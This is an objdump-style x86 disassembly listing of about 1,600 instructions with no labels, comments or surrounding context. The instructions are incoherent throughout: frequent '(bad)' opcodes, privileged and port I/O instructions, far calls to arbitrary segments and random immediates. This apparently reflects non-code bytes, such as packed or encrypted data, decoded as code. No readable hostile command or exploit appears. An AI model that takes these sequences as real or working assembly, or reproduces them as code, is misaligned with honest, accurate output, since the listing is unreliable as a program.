  4211d5:	imul   ebp,DWORD PTR [esi+0x12],0x2686e265
  4211dc:	xchg   BYTE PTR [ecx],al
  4211de:	imul   ah
  4211e0:	pusha  
  4211e1:	xchg   BYTE PTR [eax+0x6f17a80c],ah
  4211e7:	stos   BYTE PTR es:[edi],al
  4211e8:	shr    BYTE PTR [eax],0x7d
  4211eb:	jno    0x42119c
  4211ed:	push   edi
  4211ee:	das    
  4211ef:	xlat   BYTE PTR ds:[ebx]
  4211f0:	test   BYTE PTR [esi+0x3],dl
  4211f3:	pop    eax
  4211f4:	popa   
  4211f5:	pcmpgtb mm7,QWORD PTR [esi]
  4211f8:	pop    esi
  4211f9:	push   esi
  4211fa:	aad    0x68
  4211fc:	xor    eax,0xf1adfd64
  421201:	inc    esp
  421202:	inc    ecx
  421203:	xchg   ecx,eax
  421204:	xor    DWORD PTR [edx+0x71],edi
  421207:	int    0x90
  421209:	inc    esi
  42120a:	mov    bl,0x94
  42120c:	ins    BYTE PTR es:[di],dx
  42120e:	mov    al,ds:0x26dfd20e
  421213:	xor    esp,DWORD PTR [ebx]
  421215:	xor    eax,0xffffffe5
  421218:	int    0xca
  42121a:	xchg   al,bh
  42121c:	sub    al,0x65
  42121e:	sidtd  [eax+0x5]
  421222:	xor    al,BYTE PTR [edx]
  421224:	cmp    eax,0x20036db
  421229:	fstp   TBYTE PTR [ebp+0x7efda83b]
  42122f:	xor    cl,BYTE PTR [ecx]
  421231:	pop    ebp
  421232:	dec    ebp
  421233:	fidivr DWORD PTR [eax]
  421235:	sbb    BYTE PTR [edx],al
  421237:	sub    BYTE PTR [edx+0x5a],al
  42123a:	aam    0xdb
  42123c:	add    BYTE PTR [eax],bl
  42123e:	ins    BYTE PTR es:[edi],dx
  42123f:	xor    eax,edi
  421241:	sub    eax,0xb4b28101
  421246:	and    cl,BYTE PTR ss:[eax]
  421249:	xchg   esp,eax
  42124a:	shr    DWORD PTR [ecx+0x35],1
  42124d:	pusha  
  42124e:	and    dh,BYTE PTR [edx-0x1ab7d5f9]
  421254:	(bad)  
  421256:	imul   ecx,ebx,0x17
  421259:	mov    edi,0xaf801cfa
  42125e:	jecxz  0x4211fc
  421260:	ret    0x1f9
  421263:	ror    ch,0x17
  421266:	ds shl ecx,1
  421269:	je     0x42127a
  42126b:	mov    ebp,0x3a8111f4
  421270:	inc    ebp
  421271:	and    ch,BYTE PTR [eax+eax*4+0x2a7c007b]
  421278:	inc    esp
  421279:	cmp    al,0x36
  42127b:	sti    
  42127c:	jno    0x42121a
  42127e:	xchg   esi,eax
  42127f:	ror    DWORD PTR [edi-0x70],cl
  421282:	loop   0x42126d
  421284:	cmp    ch,BYTE PTR [ebx-0x60]
  421287:	jp     0x421290
  421289:	sbb    ch,BYTE PTR [ecx+0x75d9620e]
  42128f:	out    dx,eax
  421290:	fbstp  TBYTE PTR [edx]
  421292:	ds scas eax,DWORD PTR es:[edi]
  421294:	fst    DWORD PTR [eax+eiz*2-0x46c295c7]
  42129b:	jg     0x421277
  42129d:	and    ecx,DWORD PTR ds:0xfd0de1a3
  4212a3:	xchg   ebx,eax
  4212a4:	jp     0x42129e
  4212a6:	enter  0xfb3c,0xe0
  4212aa:	dec    esp
  4212ab:	daa    
  4212ac:	leave  
  4212ad:	push   esp
  4212ae:	fwait
  4212af:	or     al,0xa4
  4212b1:	inc    ebp
  4212b2:	call   0xa41:0x7158634e
  4212b9:	push   cs
  4212ba:	dec    edx
  4212bb:	imul   esi,DWORD PTR [eax+edx*8],0x94107560
  4212c2:	(bad)  
  4212c4:	push   eax
  4212c5:	inc    ecx
  4212c6:	imul   ebp,edx,0x21f03559
  4212cc:	pop    esp
  4212cd:	jecxz  0x4212a5
  4212cf:	imul   ecx,ecx,0xacbbebc3
  4212d5:	cmc    
  4212d6:	lock scas al,BYTE PTR es:[edi]
  4212d8:	or     BYTE PTR ds:0xe19c12a,cl
  4212de:	jmp    0xb8c6ea18
  4212e3:	xchg   ebx,eax
  4212e4:	pusha  
  4212e5:	jns    0x42128b
  4212e7:	imul   eax,DWORD PTR [ecx+ebx*2-0x10],0x53
  4212ec:	cdq    
  4212ed:	inc    esi
  4212ee:	jae    0x42132e
  4212f0:	mov    al,ds:0xec0709b0
  4212f5:	push   cs
  4212f6:	enter  0xa08f,0x76
  4212fa:	adc    DWORD PTR [edx+eiz*4-0x46a95ff9],0x629b5e25
  421305:	dec    edx
  421306:	ins    BYTE PTR es:[edi],dx
  421307:	mov    ds:0x1dd23f02,eax
  42130c:	push   es
  42130d:	call   0x16cb6a5f
  421312:	arpl   WORD PTR es:[eax],sp
  421315:	cmp    ch,BYTE PTR [esi+0x7999c7a0]
  42131b:	es push es
  42131d:	aam    0x5d
  42131f:	cmp    BYTE PTR cs:[ebx-0xe185409],bh
  421326:	call   DWORD PTR [edx]
  421328:	add    BYTE PTR [esi-0x5],bl
  42132b:	(bad)  
  42132c:	repz mov ebp,0xcf51fe2c
  421332:	xchg   ebx,eax
  421333:	mov    edx,0xec6eb39a
  421338:	mov    al,ds:0x5492f972
  42133d:	mov    eax,ds:0x7978aeae
  421342:	adc    al,0xb2
  421344:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  421346:	idiv   DWORD PTR [ebx-0x75666b8c]
  42134c:	inc    eax
  42134d:	fs sub eax,0x7c19f915
  421353:	push   ecx
  421354:	or     ebp,DWORD PTR [edi]
  421356:	pop    eax
  421357:	fnstcw WORD PTR [edx-0x3e561cb5]
  42135d:	ficomp DWORD PTR [edi]
  42135f:	je     0x421390
  421361:	push   ebp
  421362:	cmp    al,0x6a
  421364:	or     eax,0x7f24ac11
  421369:	lahf   
  42136a:	ror    BYTE PTR [esi+eax*4-0x21e8ada],cl
  421371:	and    dh,bh
  421373:	imul   ebp,DWORD PTR [esi+edi*1],0xe5394760
  42137a:	idiv   BYTE PTR [esi-0x4894cd71]
  421380:	dec    edx
  421381:	mov    esp,0xd6535f9f
  421386:	shr    BYTE PTR [ebx+0x8],0xdf
  42138a:	pop    ecx
  42138b:	sub    DWORD PTR [ebx],ebx
  42138d:	mov    esp,0x252a72d2
  421392:	pop    es
  421393:	jmp    0x421328
  421395:	adc    BYTE PTR [edi-0x265bdc1c],0x10
  42139c:	dec    edi
  42139d:	lea    ebx,[edx]
  42139f:	pop    edi
  4213a0:	pop    es
  4213a1:	fs popf 
  4213a3:	xor    eax,0x7b9ecd00
  4213a8:	aaa    
  4213a9:	and    BYTE PTR [ebp+0x5d],ah
  4213ac:	xchg   esp,eax
  4213ad:	mov    ebp,0xc01292b0
  4213b2:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4213b4:	cs add eax,0x1b3405c0
  4213ba:	jg     0x4213d6
  4213bc:	fldcw  WORD PTR [edx]
  4213be:	dec    ebx
  4213bf:	retf   0xbdb5
  4213c2:	sbb    BYTE PTR [edi+0x32c7e559],ah
  4213c8:	mov    cl,0xfe
  4213ca:	sub    al,0x87
  4213cc:	cmp    BYTE PTR [ebx],al
  4213ce:	cmp    dl,BYTE PTR [edi+0xca0cba6]
  4213d4:	mov    ds,WORD PTR es:[edi]
  4213d7:	inc    esp
  4213d8:	cdq    
  4213d9:	xor    ch,BYTE PTR [ebp-0x5fc25bf4]
  4213df:	jnp    0x4213d1
  4213e1:	mov    bl,0x8f
  4213e3:	(bad)  
  4213e5:	into   
  4213e6:	aas    
  4213e7:	pop    esp
  4213e8:	mov    esp,0xe7e7dcf4
  4213ed:	cmp    BYTE PTR [edi+0x361f8710],al
  4213f3:	adc    ch,BYTE PTR [esi-0x2]
  4213f6:	retf   
  4213f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213f8:	scas   al,BYTE PTR es:[edi]
  4213f9:	in     eax,0xfb
  4213fb:	(bad)  
  4213fc:	stc    
  4213fd:	ins    BYTE PTR es:[edi],dx
  4213fe:	ja     0x421411
  421400:	jne    0x421413
  421402:	add    al,0x77
  421404:	addr16 inc ebp
  421406:	add    DWORD PTR [eax],ecx
  421408:	sbb    ah,BYTE PTR [esi-0x3e47c0f4]
  42140e:	xlat   BYTE PTR ds:[ebx]
  42140f:	icebp  
  421410:	ret    
  421411:	out    dx,al
  421412:	in     eax,dx
  421413:	mov    al,ds:0x9f29fe5d
  421418:	cmp    ch,BYTE PTR [edi+0x4f]
  42141b:	iret   
  42141c:	dec    ebx
  42141d:	test   dh,cl
  42141f:	pushf  
  421420:	stos   BYTE PTR es:[edi],al
  421421:	or     ebx,DWORD PTR [esi+0x15]
  421424:	inc    eax
  421425:	jae    0x42143f
  421427:	test   eax,0xe0a30dff
  42142c:	cmp    DWORD PTR [ebp-0x5eb54bf9],esp
  421432:	shl    DWORD PTR [ecx-0x72],cl
  421435:	loop   0x421431
  421437:	fld    TBYTE PTR [eax]
  421439:	cmp    eax,0x432de680
  42143e:	lods   al,BYTE PTR ds:[esi]
  42143f:	xchg   DWORD PTR [edi],eax
  421441:	add    eax,DWORD PTR [ebp+0x5f]
  421444:	and    DWORD PTR [esi-0x5e9395ba],0xc501c72c
  42144e:	ror    esi,0xaa
  421451:	jecxz  0x42146e
  421453:	jo     0x42144a
  421455:	push   ds
  421456:	xchg   edi,eax
  421457:	adc    al,0xfb
  421459:	fiadd  DWORD PTR [ecx]
  42145b:	sub    esp,DWORD PTR [ebx]
  42145d:	inc    edi
  42145e:	std    
  42145f:	cmp    eax,ecx
  421461:	push   esi
  421462:	dec    eax
  421463:	cmp    eax,0x8c68e0c5
  421468:	(bad)  
  421469:	sbb    al,0xe4
  42146b:	cmp    DWORD PTR [ebp-0x48],eax
  42146e:	inc    ecx
  42146f:	mov    dh,BYTE PTR [edi]
  421471:	dec    eax
  421472:	jp     0x42143e
  421474:	ins    BYTE PTR es:[edi],dx
  421475:	sub    al,0xed
  421477:	inc    ecx
  421478:	retf   
  421479:	inc    eax
  42147a:	jecxz  0x42148b
  42147c:	rcl    ch,0xac
  42147f:	jmp    0x4d487c34
  421484:	mov    esi,DWORD PTR [ebx+0x2540dc00]
  42148a:	arpl   WORD PTR [ecx],bx
  42148c:	sub    eax,DWORD PTR [eax]
  42148e:	push   0xffffffa0
  421490:	fstp   QWORD PTR [eax+ecx*1]
  421493:	xchg   edx,eax
  421494:	shr    DWORD PTR [eax+eiz*1-0x16],1
  421498:	das    
  421499:	xlat   BYTE PTR ds:[ebx]
  42149a:	cmp    al,0xe3
  42149c:	or     edi,DWORD PTR [edx]
  42149e:	sbb    BYTE PTR [edx-0x34735f16],cl
  4214a4:	and    al,0xfd
  4214a6:	xchg   ebx,eax
  4214a7:	jl     0x4214aa
  4214a9:	mov    eax,0xf60eba9e
  4214ae:	(bad)  
  4214af:	fidiv  WORD PTR [esi+eax*2+0x1a]
  4214b3:	xlat   BYTE PTR ds:[ebx]
  4214b4:	rcl    ch,cl
  4214b6:	fbld   TBYTE PTR [eax-0x218817c3]
  4214bc:	dec    ebx
  4214bd:	mov    ds:0x7c3877be,eax
  4214c2:	jnp    0x42147e
  4214c4:	jo     0x4214bb
  4214c6:	cmp    DWORD PTR [eax],0xffffffa7
  4214c9:	jo     0x4214f9
  4214cb:	or     al,0xa0
  4214cd:	pop    ebx
  4214ce:	sahf   
  4214cf:	cmp    al,0x37
  4214d1:	jmp    0x421522
  4214d3:	scas   al,BYTE PTR es:[edi]
  4214d4:	jb     0x4214b4
  4214d6:	sar    ebx,cl
  4214d8:	test   ch,bl
  4214da:	call   0xb5e575d0
  4214df:	mov    edx,0x7f03d41d
  4214e4:	jae    0x4214ef
  4214e6:	push   0x6c960aae
  4214eb:	fs mov ecx,0x68cf502c
  4214f1:	sub    ebp,DWORD PTR [eax-0x2861344c]
  4214f7:	add    eax,DWORD PTR [ecx+0x1c]
  4214fa:	pop    esp
  4214fb:	push   0x4689a4dc
  421500:	xlat   BYTE PTR ds:[ebx]
  421501:	mov    ah,dh
  421503:	int    0xd0
  421505:	add    edi,ecx
  421507:	xor    dl,BYTE PTR [eax+0x6e]
  42150a:	mov    eax,ds:0x115129f6
  42150f:	fdivr  QWORD PTR [ebp+0x34a02a3a]
  421515:	inc    edi
  421516:	dec    esp
  421517:	jne    0x42151b
  421519:	inc    edx
  42151a:	lods   al,BYTE PTR ds:[esi]
  42151b:	adc    eax,DWORD PTR [ebx]
  42151d:	(bad)  
  42151e:	ror    BYTE PTR [esp+eax*4],1
  421521:	or     al,0xc9
  421523:	out    0x94,eax
  421525:	push   ecx
  421526:	aas    
  421527:	imul   edx,DWORD PTR [esp+edx*2],0x8e933d74
  42152e:	jecxz  0x421535
  421530:	jle    0x4214e8
  421532:	cmp    DWORD PTR [esi],0x72afda4b
  421538:	pusha  
  421539:	fistp  WORD PTR [edx+eiz*2+0x7bb5e7b2]
  421540:	in     al,0x6
  421542:	enter  0x44b,0x38
  421546:	jmp    0x797580aa
  42154b:	push   DWORD PTR [edi]
  42154d:	mov    eax,ds:0x603ba49e
  421552:	jne    0x421509
  421554:	push   ds
  421555:	inc    edi
  421556:	rol    BYTE PTR [ebx],cl
  421558:	or     ecx,DWORD PTR [ecx-0x5da0d423]
  42155e:	sub    eax,0x162ae46
  421563:	shr    ah,1
  421565:	test   al,0xe4
  421567:	sbb    BYTE PTR [ecx+0x1a],al
  42156a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42156b:	lods   al,BYTE PTR cs:[esi]
  42156d:	sbb    esp,eax
  42156f:	jecxz  0x4215b9
  421571:	imul   ecx,DWORD PTR [edi],0x85abf5de
  421577:	pop    ss
  421578:	scas   eax,DWORD PTR es:[edi]
  421579:	int3   
  42157a:	shr    BYTE PTR [esi],0x29
  42157d:	les    eax,FWORD PTR [ebx+0x664ed78b]
  421583:	loopne 0x4215c3
  421585:	nop
  421586:	pop    es
  421587:	aam    0xc1
  421589:	sbb    bh,BYTE PTR ds:[eax]
  42158c:	adc    edx,DWORD PTR [esi+0x1b335cee]
  421592:	mov    ds:0x2b7a952c,eax
  421597:	retf   
  421598:	test   BYTE PTR [ebp-0x21bfb784],dh
  42159e:	pop    ecx
  42159f:	and    ch,bl
  4215a1:	(bad)  
  4215a2:	(bad)  
  4215a4:	add    al,bh
  4215a6:	push   ds
  4215a7:	into   
  4215a8:	and    DWORD PTR [ebx+ecx*1+0x5e0fc803],ebx
  4215af:	jge    0x42156f
  4215b1:	fwait
  4215b2:	sub    eax,0xce48d2eb
  4215b7:	mov    DWORD PTR [ebx+0x28a0922],ebp
  4215bd:	adc    eax,0x27dfbd71
  4215c2:	shl    DWORD PTR [edi],cl
  4215c4:	out    dx,al
  4215c5:	stc    
  4215c6:	push   ecx
  4215c7:	shl    DWORD PTR [ebx+0x5b26472],cl
  4215cd:	and    dh,al
  4215cf:	or     al,0xcd
  4215d1:	xor    dl,BYTE PTR [edi+eax*2+0x69]
  4215d5:	inc    ebx
  4215d6:	pop    ecx
  4215d7:	mov    dl,0xc
  4215d9:	aaa    
  4215da:	dec    esp
  4215db:	popa   
  4215dc:	sbb    edi,DWORD PTR [esi+0x76d8afea]
  4215e2:	rcr    DWORD PTR [ebp-0x48],1
  4215e5:	ret    0x91ea
  4215e8:	pop    ebx
  4215e9:	ds adc eax,0x2f490d64
  4215ef:	scas   al,BYTE PTR es:[edi]
  4215f0:	repz jmp 0xf2b3:0xdc8607de
  4215f8:	mov    ebx,0x5ba82b97
  4215fd:	xchg   DWORD PTR ds:0x6ef800de,ebp
  421603:	inc    edx
  421604:	xor    BYTE PTR [ebx],cl
  421606:	jp     0x4215e5
  421608:	inc    ebp
  421609:	cmc    
  42160a:	fmul   st,st(3)
  42160c:	mov    bl,0xea
  42160e:	and    eax,0xf73cd3fd
  421613:	mov    al,0x80
  421615:	outs   dx,DWORD PTR ds:[esi]
  421616:	and    ebp,0x77be63f2
  42161c:	ror    BYTE PTR [edi+0x33],1
  42161f:	cmp    al,BYTE PTR [ebx-0x69a45361]
  421625:	jecxz  0x421696
  421627:	push   cs
  421628:	into   
  421629:	xor    edi,edi
  42162b:	popa   
  42162c:	imul   edi,ecx,0x24641e68
  421632:	push   esi
  421633:	jbe    0x421695
  421635:	cld    
  421636:	out    dx,al
  421637:	in     eax,0x1
  421639:	pushf  
  42163a:	add    eax,0x70b8ed31
  42163f:	dec    ecx
  421640:	call   FWORD PTR [eax+0x7f]
  421643:	jg     0x421626
  421645:	sub    cl,bl
  421647:	test   ebp,edx
  421649:	popf   
  42164a:	push   ds
  42164b:	xchg   edx,eax
  42164c:	rol    BYTE PTR [edi-0x596d812e],0x27
  421653:	icebp  
  421654:	(bad)  
  421655:	xor    al,0xf4
  421657:	xchg   esp,eax
  421658:	cmp    DWORD PTR [ebp+eax*1-0x1d],0x5e8d1c54
  421660:	inc    esi
  421661:	fstp   QWORD PTR ds:0x3220c94c
  421667:	cld    
  421668:	mov    esp,0x4ead6e40
  42166d:	pop    ss
  42166e:	push   eax
  42166f:	iret   
  421670:	push   ss
  421671:	cwde   
  421672:	aad    0x3c
  421674:	(bad)  
  421676:	addr16 stc 
  421678:	sub    esi,DWORD PTR [edx+0x4d]
  42167b:	retf   
  42167c:	call   0x67e:0xa082be25
  421683:	push   esi
  421684:	leave  
  421685:	out    0xf2,eax
  421687:	cs nop
  421689:	out    0x2f,eax
  42168b:	jge    0x4216f9
  42168d:	(bad)  
  42168e:	pop    ds
  42168f:	pop    edi
  421690:	aam    0xf9
  421692:	or     BYTE PTR [ebp-0x3ffc727b],0xfd
  421699:	lahf   
  42169a:	jl     0x421715
  42169c:	das    
  42169d:	(bad)  
  42169f:	icebp  
  4216a0:	(bad)  
  4216a1:	cld    
  4216a2:	sub    eax,0x1a282aaa
  4216a7:	pushf  
  4216a8:	or     DWORD PTR [ecx*8+0x764b6346],esi
  4216af:	sahf   
  4216b0:	jle    0x421634
  4216b2:	xor    al,0x22
  4216b4:	mov    ebp,0x7654fb2a
  4216b9:	(bad)  
  4216ba:	jbe    0x4216a0
  4216bc:	fld    QWORD PTR ds:0x7ecb85c0
  4216c2:	popf   
  4216c3:	aaa    
  4216c4:	and    al,0x19
  4216c6:	test   BYTE PTR [edx],bl
  4216c8:	sub    al,0xd1
  4216ca:	mov    ecx,0xe7ddaf87
  4216cf:	inc    eax
  4216d0:	push   eax
  4216d1:	sahf   
  4216d2:	aad    0x72
  4216d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216d5:	push   cs
  4216d6:	call   0x9feac3f9
  4216db:	sub    al,0x4f
  4216dd:	outs   dx,DWORD PTR ds:[esi]
  4216de:	dec    eax
  4216df:	xchg   ebx,eax
  4216e0:	pop    esi
  4216e1:	mov    bl,0xfd
  4216e3:	xor    ecx,DWORD PTR [ecx+ebx*1+0x7ae45038]
  4216ea:	ins    DWORD PTR es:[edi],dx
  4216eb:	gs push cs
  4216ed:	fiadd  DWORD PTR [esi]
  4216ef:	sar    BYTE PTR [ecx+ebx*8-0x10],0xb2
  4216f4:	(bad)  
  4216f5:	shl    DWORD PTR [edi+0x206c610e],1
  4216fb:	push   edi
  4216fc:	add    ebx,DWORD PTR ds:0x3a7f8c23
  421702:	ds enter 0xfcb4,0x9c
  421707:	jnp    0x4216fa
  421709:	mov    dl,0xbe
  42170b:	cwde   
  42170c:	dec    eax
  42170d:	mov    esp,0xa507c12c
  421712:	jbe    0x42173d
  421714:	add    ah,dl
  421716:	cmp    eax,0x52371609
  42171b:	cli    
  42171c:	popa   
  42171d:	push   ecx
  42171e:	rol    DWORD PTR [ebx+ecx*2+0x7408c994],0x59
  421726:	jb     0x421704
  421728:	in     al,dx
  421729:	push   esp
  42172a:	int3   
  42172b:	enter  0x275d,0x84
  42172f:	or     eax,0xc741db1
  421734:	and    DWORD PTR [eax-0x20],0xffffff8c
  421738:	xor    edi,0xffffffa8
  42173b:	inc    edi
  42173c:	popf   
  42173d:	or     al,0xc2
  42173f:	mov    eax,ds:0xc8c27b82
  421744:	loop   0x421738
  421746:	and    eax,0xb6f7f7b8
  42174b:	call   0x5f42:0xad70ce89
  421752:	retf   
  421753:	jecxz  0x42174e
  421755:	sub    DWORD PTR [ebp-0x234e0499],ecx
  42175b:	xchg   ecx,eax
  42175c:	into   
  42175d:	pop    es
  42175e:	ret    
  42175f:	cmc    
  421760:	cmp    BYTE PTR [eax-0x55470c9b],ch
  421766:	mov    bh,0xf1
  421768:	cmp    ecx,esi
  42176a:	dec    al
  42176c:	add    BYTE PTR [esi-0x80],dh
  42176f:	mov    esp,0xa7f79ff8
  421774:	popf   
  421775:	retf   
  421776:	jg     0x4216f9
  421778:	jae    0x421782
  42177a:	sbb    ebp,edi
  42177c:	add    ch,BYTE PTR [edi+ebx*2]
  42177f:	(bad)  
  421780:	out    dx,al
  421781:	xchg   DWORD PTR [esi+0x78],esp
  421784:	std    
  421785:	iret   
  421786:	push   esi
  421787:	fidiv  WORD PTR [edx+eax*1-0x6078ab4c]
  42178e:	xor    edi,DWORD PTR [ecx+0x199bd767]
  421794:	add    BYTE PTR [edx+0x30],dl
  421797:	outs   dx,BYTE PTR ds:[esi]
  421798:	xchg   edi,eax
  421799:	add    al,0x7c
  42179b:	xlat   BYTE PTR ds:[ebx]
  42179c:	sahf   
  42179d:	scas   eax,DWORD PTR es:[edi]
  42179e:	shl    BYTE PTR [edx+0x5a],0x4a
  4217a2:	xor    eax,DWORD PTR [ecx+0x78d9f516]
  4217a8:	dec    edx
  4217a9:	mov    DWORD PTR [ebp-0x6034ebb3],ecx
  4217af:	push   esp
  4217b0:	xchg   edx,eax
  4217b1:	jmp    0xba82a39a
  4217b6:	or     cl,BYTE PTR [edi+esi*4]
  4217b9:	loope  0x421741
  4217bb:	jmp    0x27cc604a
  4217c0:	or     DWORD PTR [edx-0x56],0x28
  4217c4:	leave  
  4217c5:	retf   0x54e3
  4217c8:	pop    edx
  4217c9:	mov    edi,cs
  4217cb:	sbb    DWORD PTR [edx],eax
  4217cd:	retf   
  4217ce:	(bad)  
  4217cf:	mov    dl,0x12
  4217d1:	mov    al,0x8a
  4217d3:	add    DWORD PTR [ebx-0x79],edx
  4217d6:	mov    dh,0xfb
  4217d8:	inc    ebx
  4217d9:	stc    
  4217da:	sar    BYTE PTR [eax+0x3afaf68d],1
  4217e0:	add    BYTE PTR [esi-0x73],cl
  4217e3:	add    dh,BYTE PTR [ebp-0x1f]
  4217e6:	nop
  4217e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217e8:	popf   
  4217e9:	in     al,0x1a
  4217eb:	in     eax,0x2a
  4217ed:	xchg   esp,eax
  4217ee:	xlat   BYTE PTR ds:[ebx]
  4217ef:	inc    ebx
  4217f0:	inc    edx
  4217f1:	jge    0x4217d4
  4217f3:	sub    cl,bl
  4217f5:	arpl   WORD PTR [eax],ax
  4217f7:	dec    ebx
  4217f8:	pandn  mm2,QWORD PTR [ebx+ebx*2+0x6e3692f3]
  421800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421801:	int3   
  421802:	xor    bl,dl
  421804:	pop    ecx
  421805:	add    eax,0xa7cb80ca
  42180a:	test   DWORD PTR ds:0xabb184a5,esp
  421810:	(bad)  
  421811:	cld    
  421812:	test   DWORD PTR [edx],ebp
  421814:	repz cmp eax,0x495d8581
  42181a:	cmp    esi,DWORD PTR [ecx]
  42181c:	retf   0x9d19
  42181f:	leave  
  421820:	cmp    DWORD PTR ds:0x9a95dd00,ebx
  421826:	scas   eax,DWORD PTR es:[edi]
  421827:	jmp    0x421829
  421829:	mov    ebx,0xab8d5d5d
  42182e:	cli    
  42182f:	shl    BYTE PTR [ecx-0x80],0xc6
  421833:	inc    ebx
  421834:	lgs    ebp,FWORD PTR ds:0x7d4eaa1b
  42183b:	sar    DWORD PTR [edx+0x16],cl
  42183e:	mov    ah,0x75
  421840:	push   ss
  421841:	cdq    
  421842:	push   0x77
  421844:	mov    ds:0xfcf57c31,al
  421849:	fisubr DWORD PTR [ebp-0x50]
  42184c:	jmp    0x9e81c714
  421851:	popf   
  421852:	pop    ebp
  421853:	call   edx
  421855:	daa    
  421856:	add    BYTE PTR [edi+eax*8-0x7a],bl
  42185a:	ret    
  42185b:	out    0xc7,al
  42185d:	add    BYTE PTR [esi-0x3],ch
  421860:	repnz and ebx,DWORD PTR [ebp+0x7f]
  421864:	xchg   esi,eax
  421865:	xlat   BYTE PTR ds:[ebx]
  421866:	dec    esi
  421867:	das    
  421868:	imul   eax,DWORD PTR [ebp-0x3564173b],0xd088cfb3
  421872:	mov    al,0x26
  421874:	inc    eax
  421875:	push   ds
  421876:	mov    al,ds:0x7dad06e0
  42187b:	lods   al,BYTE PTR ds:[esi]
  42187c:	test   al,0x74
  42187e:	push   ebx
  42187f:	les    ebp,FWORD PTR [ecx]
  421881:	hlt    
  421882:	fstp   DWORD PTR [edx-0x46967829]
  421888:	or     edx,DWORD PTR [eax+0x60cc8d2e]
  42188e:	mov    eax,0x7ab8e003
  421893:	adc    DWORD PTR [edi-0x11],ebp
  421896:	test   BYTE PTR [edx+0x3c],bh
  421899:	mov    bh,0x79
  42189b:	retf   
  42189c:	mov    eax,0x80c1c02e
  4218a1:	push   es
  4218a2:	sbb    BYTE PTR ds:0xe5c576ca,dl
  4218a8:	push   eax
  4218a9:	lahf   
  4218aa:	(bad)  
  4218ab:	sbb    ecx,edx
  4218ad:	pop    ecx
  4218ae:	add    eax,0x4f329dde
  4218b3:	jecxz  0x4218a8
  4218b5:	icebp  
  4218b6:	inc    ebx
  4218b7:	int    0x27
  4218b9:	inc    ecx
  4218ba:	add    BYTE PTR [eax+eax*4-0x58],0x70
  4218bf:	imul   ebp,DWORD PTR [edx+0x74d53dca],0x77cd7069
  4218c9:	add    eax,0x69678d54
  4218ce:	addr16 out 0x65,al
  4218d1:	sar    esp,1
  4218d3:	mov    ch,0x63
  4218d5:	xor    al,0x10
  4218d7:	jnp    0x42186f
  4218d9:	lods   al,BYTE PTR ds:[esi]
  4218da:	and    ebx,0x37
  4218dd:	add    dl,ch
  4218df:	push   esp
  4218e0:	mov    al,0x1c
  4218e2:	shl    ebp,1
  4218e4:	jb     0x421917
  4218e6:	mov    ds:0xba6b97d5,eax
  4218eb:	ins    BYTE PTR es:[edi],dx
  4218ec:	or     BYTE PTR [eax],dl
  4218ee:	cmp    esi,DWORD PTR ds:0x5d9184df
  4218f4:	in     al,0x83
  4218f6:	sar    ebx,1
  4218f8:	sti    
  4218f9:	add    ah,BYTE PTR [eiz*2-0x668ac593]
  421900:	imul   edi,DWORD PTR [edx-0x68],0xffffffa1
  421904:	sar    DWORD PTR [ebx],1
  421906:	bswap  edx
  421908:	push   ds
  421909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42190a:	add    BYTE PTR [ecx-0xb],0x4b
  42190e:	inc    eax
  42190f:	mov    ch,0x31
  421911:	jo     0x421984
  421913:	sub    bl,BYTE PTR [esi]
  421915:	addr16 inc edx
  421917:	ds dec ebp
  421919:	cmp    ah,dl
  42191b:	add    al,0x53
  42191d:	pop    edi
  42191e:	nop
  42191f:	jnp    0x42195d
  421921:	or     esp,eax
  421923:	jae    0x4218fd
  421925:	jo     0x4218ff
  421927:	cmp    BYTE PTR [eax],al
  421929:	in     al,0xe1
  42192b:	out    dx,al
  42192c:	inc    edi
  42192d:	mov    edx,0xa19e345d
  421932:	xor    DWORD PTR [eax+0x5b],esi
  421935:	sub    ebp,0x61
  421938:	dec    edx
  421939:	cwde   
  42193a:	xor    bl,BYTE PTR [esi-0x30]
  42193d:	or     BYTE PTR [esi],ah
  42193f:	add    BYTE PTR [edi-0x4bc9d22e],0x2e
  421946:	out    dx,al
  421947:	enter  0xcf13,0xf3
  42194b:	jae    0x4219af
  42194d:	test   dl,bl
  42194f:	rol    DWORD PTR [edi-0x1d],0x58
  421953:	aaa    
  421954:	mov    eax,ds:0xa37182bb
  421959:	sar    BYTE PTR [edx+edi*2-0x2d2fc09b],1
  421960:	cmp    al,0x12
  421962:	xchg   edi,eax
  421963:	out    dx,al
  421964:	push   0xfffffffb
  421966:	xchg   ebx,eax
  421967:	push   ss
  421968:	stos   DWORD PTR es:[edi],eax
  421969:	and    bh,BYTE PTR [ecx-0x22a2a70f]
  42196f:	and    edx,ecx
  421971:	add    ebx,DWORD PTR [edx+0x7f]
  421974:	mov    ah,0xd8
  421976:	or     DWORD PTR [esp+esi*8-0x46],eax
  42197a:	add    dl,ch
  42197c:	push   esp
  42197d:	pop    ss
  42197e:	rol    DWORD PTR [edx],cl
  421980:	call   0xc656:0x831a6ad3
  421987:	xchg   ebp,eax
  421988:	in     al,dx
  421989:	xchg   ecx,eax
  42198a:	xor    eax,0x69ea4e03
  42198f:	xchg   ebx,eax
  421990:	xchg   esp,eax
  421991:	xlat   BYTE PTR ds:[ebx]
  421992:	add    DWORD PTR [eax+0xbd851de],ebx
  421998:	fld    DWORD PTR [ebx-0x4e0cfd7d]
  42199e:	mov    esp,0xcf9adb0b
  4219a3:	pop    edx
  4219a4:	cmp    eax,0x4143ad7c
  4219a9:	rcr    DWORD PTR [edi-0x71],cl
  4219ac:	cmp    al,bl
  4219ae:	ins    DWORD PTR es:[edi],dx
  4219af:	loope  0x42197f
  4219b1:	call   0xcc91:0xf1c94bac
  4219b8:	in     eax,0xd5
  4219ba:	ins    BYTE PTR es:[edi],dx
  4219bb:	mov    bl,0x19
  4219bd:	rcr    BYTE PTR [ebp-0x3b],1
  4219c0:	mov    eax,0xe3ca6b19
  4219c5:	sub    cl,BYTE PTR [ebx]
  4219c7:	fs nop
  4219c9:	push   ebx
  4219ca:	jg     0x421a22
  4219cc:	imul   BYTE PTR [ebx]
  4219ce:	inc    eax
  4219cf:	out    dx,al
  4219d0:	in     eax,0xf0
  4219d2:	fwait
  4219d3:	iret   
  4219d4:	push   0x5c
